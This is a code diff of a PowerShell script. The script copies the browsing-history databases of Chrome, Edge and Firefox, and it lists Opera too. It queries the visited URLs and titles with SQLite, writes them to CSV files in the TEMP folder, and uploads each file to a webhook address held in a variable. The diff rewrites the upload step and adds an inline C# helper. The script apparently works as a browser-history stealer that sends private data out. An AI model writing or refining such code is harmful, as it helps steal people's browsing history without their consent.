@@ -15,20 +15,31 @@ function Export-ChromeEdgeHistory {
     )
     
     $query = @"
-    SELECT 
-        url, 
-        title, 
-        datetime(last_visit_time/1000000-11644473600, 'unixepoch') as last_visit_time 
-    FROM 
-        urls 
-    ORDER BY 
-        last_visit_time DESC
-    "@
+SELECT 
+    url, 
+    title, 
+    datetime(last_visit_time/1000000-11644473600, 'unixepoch') as last_visit_time 
+FROM 
+    urls 
+ORDER BY 
+    last_visit_time DESC
+"@
 
     $tempDb = "$env:TEMP\${browser}_History"
     Copy-Item $historyPath $tempDb -Force
 
-    $connectionString = "Data Source=$tempDb;Version=3;"
+    # Load SQLite assembly
+    Add-Type -TypeDefinition @"
+using System;
+using System.Data.SQLite;
+public class SQLiteHelper {
+    public static string GetConnectionString(string dbPath) {
+        return $"Data Source={dbPath};Version=3;";
+    }
+}
+"@
+    $connectionString = [SQLiteHelper]::GetConnectionString($tempDb)
+
     $connection = New-Object System.Data.SQLite.SQLiteConnection
     $connection.ConnectionString = $connectionString
     $connection.Open()
@@ -61,20 +72,31 @@ function Export-FirefoxHistory {
     )
 
     $query = @"
-    SELECT 
-        moz_places.url, 
-        moz_places.title, 
-        datetime(moz_historyvisits.visit_date/1000000, 'unixepoch') as visit_date 
-    FROM 
-        moz_places, 
-        moz_historyvisits 
-    WHERE 
-        moz_places.id = moz_historyvisits.place_id 
-    ORDER BY 
-        visit_date DESC
-    "@
+SELECT 
+    moz_places.url, 
+    moz_places.title, 
+    datetime(moz_historyvisits.visit_date/1000000, 'unixepoch') as visit_date 
+FROM 
+    moz_places, 
+    moz_historyvisits 
+WHERE 
+    moz_places.id = moz_historyvisits.place_id 
+ORDER BY 
+    visit_date DESC
+"@
 
-    $connectionString = "Data Source=$historyPath;Version=3;"
+    # Load SQLite assembly
+    Add-Type -TypeDefinition @"
+using System;
+using System.Data.SQLite;
+public class SQLiteHelper {
+    public static string GetConnectionString(string dbPath) {
+        return $"Data Source={dbPath};Version=3;";
+    }
+}
+"@
+    $connectionString = [SQLiteHelper]::GetConnectionString($historyPath)
+
     $connection = New-Object System.Data.SQLite.SQLiteConnection
     $connection.ConnectionString = $connectionString
     $connection.Open()
@@ -105,16 +127,13 @@ function Send-FileToWebhook {
         [string]$whuri
     )
 
-    $fileBytes = [System.IO.File]::ReadAllBytes($filePath)
-    $fileBase64 = [Convert]::ToBase64String($fileBytes)
     $fileName = [System.IO.Path]::GetFileName($filePath)
 
-    $body = @{
-        content = "Browser history file: $fileName"
-        file = $fileBase64
+    $form = @{
+        file1 = [System.IO.File]::ReadAllBytes($filePath)
     }
 
-    Invoke-RestMethod -Uri $whuri -Method Post -Body (ConvertTo-Json $body) -ContentType "application/json"
+    Invoke-RestMethod -Uri $whuri -Method Post -Form $form
 }
 
 # Set the output directory to the TEMP folder
@@ -133,10 +152,10 @@ $browsers = @('chrome', 'edge', 'firefox', 'opera')
 
 foreach ($browser in $browsers) {
     $historyPath = $paths["${browser}_history"]
-    $outputFile = "$outputDir\$browser-$browser-history.csv"
+    $outputFile = "$outputDir\${browser}-history.csv"
     
     if ($browser -eq 'firefox') {
-        $profiles = Get-ChildItem -Path $historyPath
+        $profiles = Get-ChildItem -Path $historyPath -Directory
         foreach ($profile in $profiles) {
             Export-FirefoxHistory -historyPath $profile.FullName -outputFile $outputFile
             Send-FileToWebhook -filePath $outputFile -whuri $whuri
